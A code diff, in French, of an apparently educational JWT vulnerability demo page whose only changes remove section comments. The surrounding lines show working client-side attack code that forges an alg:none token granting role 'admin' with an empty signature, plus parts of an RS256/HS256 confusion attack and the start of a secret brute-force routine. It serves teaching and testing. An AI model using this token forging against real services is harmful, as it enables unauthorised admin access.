@@ -131,7 +131,6 @@
 
   <div class="grid">
 
-    <!-- ── AUTHENTIFICATION ──────────────────────────────────────────────── -->
     <div class="card">
       <h2>🔑 Authentification <span class="tag tag-info">Étape 1</span></h2>
       <p class="explanation">
@@ -148,7 +147,6 @@
       <div class="output" id="token-decoded">—</div>
     </div>
 
-    <!-- ── ENDPOINTS ─────────────────────────────────────────────────────── -->
     <div class="card">
       <h2>🌐 Endpoints API <span class="tag tag-info">Tests</span></h2>
       <p class="explanation">
@@ -163,7 +161,6 @@
       <div class="output" id="api-output">—</div>
     </div>
 
-    <!-- ── ATTAQUE 1 : alg:none ──────────────────────────────────────────── -->
     <div class="card">
       <h2>⚠️ Attaque 1 — alg:none <span class="tag tag-vuln">VULN 1</span></h2>
       <p class="explanation">
@@ -178,7 +175,6 @@
       <div class="output" id="attack1-output">—</div>
     </div>
 
-    <!-- ── ATTAQUE 2 : confusion ─────────────────────────────────────────── -->
     <div class="card">
       <h2>⚠️ Attaque 2 — Confusion RS256/HS256 <span class="tag tag-vuln">VULN 2</span></h2>
       <p class="explanation">
@@ -193,7 +189,6 @@
       <div class="output" id="attack2-output">—</div>
     </div>
 
-    <!-- ── ATTAQUE 3 : brute force ──────────────────────────────────────── -->
     <div class="card full-width">
       <h2>⚠️ Attaque 3 — Force brute du secret HS256 <span class="tag tag-vuln">VULN 3</span></h2>
       <p class="explanation">
@@ -213,8 +208,6 @@
 </div>
 
 <script>
-// ─── État de l'application ───────────────────────────────────────────────────
-
 let currentToken = null;
 
 function setOutput(id, text, cls = '') {
@@ -255,8 +248,6 @@ function updateTokenDisplay(token) {
   }
 }
 
-// ─── Authentification ────────────────────────────────────────────────────────
-
 async function doLogin() {
   const username = document.getElementById('login-user').value;
   const password = document.getElementById('login-pass').value;
@@ -291,8 +282,6 @@ async function doLoginRS256() {
   }
 }
 
-// ─── Tests d'endpoints ───────────────────────────────────────────────────────
-
 async function callApi(url, withToken = true) {
   const headers = withToken && currentToken
     ? { Authorization: 'Bearer ' + currentToken }
@@ -306,8 +295,6 @@ async function callApi(url, withToken = true) {
   }
 }
 
-// ─── Attaque 1 : alg:none ────────────────────────────────────────────────────
-
 async function attackAlgNone() {
   if (!currentToken) {
     setOutput('attack1-output', 'Connectez-vous d\'abord pour obtenir un token.', 'error');
@@ -317,10 +304,9 @@ async function attackAlgNone() {
   const original = decodeToken(currentToken);
   if (!original) return;
 
-  // Forger le token avec alg:none et role:admin
   const fHeader  = b64Encode({ alg: 'none', typ: 'JWT' });
   const fPayload = b64Encode({ ...original.payload, role: 'admin', note: 'forgé par attaque alg:none' });
-  const forged   = fHeader + '.' + fPayload + '.'; // signature vide
+  const forged   = fHeader + '.' + fPayload + '.';
 
   document.getElementById('forged-token-1').textContent = forged;
 
@@ -340,9 +326,6 @@ async function attackAlgNone() {
     setOutput('attack1-output', 'Erreur : ' + e.message, 'error');
   }
 }
-
-// ─── Attaque 2 : confusion RS256/HS256 ──────────────────────────────────────
-// Note : le navigateur n'a pas accès à crypto.createHmac — on simule via SubtleCrypto
 
 async function hmacSHA256(key, data) {
   const enc        = new TextEncoder();
@@ -393,8 +376,6 @@ async function attackConfusion() {
     setOutput('attack2-output', 'Erreur : ' + e.message, 'error');
   }
 }
-
-// ─── Attaque 3 : force brute ─────────────────────────────────────────────────
 
 async function attackBruteForce() {
   if (!currentToken) {
